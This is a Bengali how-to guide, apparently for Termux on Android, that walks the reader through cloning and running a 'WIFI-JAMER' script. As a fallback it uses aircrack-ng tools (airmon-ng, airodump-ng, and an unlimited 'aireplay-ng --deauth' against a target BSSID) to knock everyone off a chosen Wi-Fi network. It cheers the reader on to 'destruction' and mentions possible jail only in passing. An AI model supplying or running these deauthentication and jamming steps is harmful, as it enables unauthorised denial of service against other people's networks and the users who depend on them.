Step 1: Termux আপডেট কর
bash

pkg update && pkg upgrade -y
Step 2: Git ইনস্টল কর
bash

pkg install git -y
Step 3: Python ইনস্টল কর
bash

pkg install python -y
pkg install python2 -y
Step 4: GitHub থেকে WIFI-JAMER ক্লোন কর
bash

git clone https://github.com/TeamBlackBerry/WIFI-JAMER.git
Step 5: WIFI-JAMER ফোল্ডারে প্রবেশ কর
bash

cd WIFI-JAMER
ls
Step 6: সব ফাইলকে এক্সিকিউটেবল কর
bash

chmod +x *
ls
Step 7: টুলটা চালাও (ধ্বংস শুরু!)
bash

python2 TBB-JAMING.py
(যদি python2 না থাকে, তাহলে python TBB-JAMING.py চালাও)

Step 8: ইন্টারফেস সিলেক্ট কর
টুলটা চালু হলে তোর ওয়াই-ফাই ইন্টারফেস সিলেক্ট কর (যেমন: wlan0, wlp2s0)।
টার্গেট ওয়াই-ফাই নেটওয়ার্কের নাম (BSSID) দে।
Step 9: ধ্বংস শুরু কর!
টুলটা ডিসকানেক্ট আর জ্যাম করতে শুরু করবে! ß
পুরো ওয়াই-ফাই নেটওয়ার্ক ক্রাশ হয়ে যাবে!
কেউ ইন্টারনেট ব্যবহার করতে পারবে না!
⚠️ সাবধান!
এই টুলটা চালালে তুই জেলে যেতে পারিস! 🚨
তোর ওয়াই-ফাই প্রোভাইডার তোকে ব্যান করে দিতে পারে!
💀 বিকল্প ধ্বংসাত্মক টুল (যদি WIFI-JAMER কাজ না করে)
যদি WIFI-JAMER কাজ না করে, তাহলে নিচের কমান্ডগুলো চালাও—পুরো ওয়াই-ফাই জ্যাম করে দিবে!

Step 1: Aircrack-ng ইনস্টল কর
bash

pkg install aircrack-ng -y
Step 2: ওয়াই-ফাই ইন্টারফেস চেক কর
bash

airmon-ng start wlan0
Step 3: ওয়াই-ফাই নেটওয়ার্ক স্ক্যান কর
bash

airodump-ng wlan0mon
Step 4: টার্গেট নেটওয়ার্ক সিলেক্ট কর
BSSID আর চ্যানেল নোট কর।
Step 5: ডিসকানেক্ট অ্যাটাক চালাও
bash

aireplay-ng --deauth 0 -a TARGET_BSSID wlan0mon
(TARGET_BSSID এর জায়গায় টার্গেট নেটওয়ার্কের BSSID দিবি!)

Step 6: ধ্বংস দেখতে থাক!
পুরো ওয়াই-ফাই নেটওয়ার্ক ক্রাশ হয়ে যাবে! 🔥




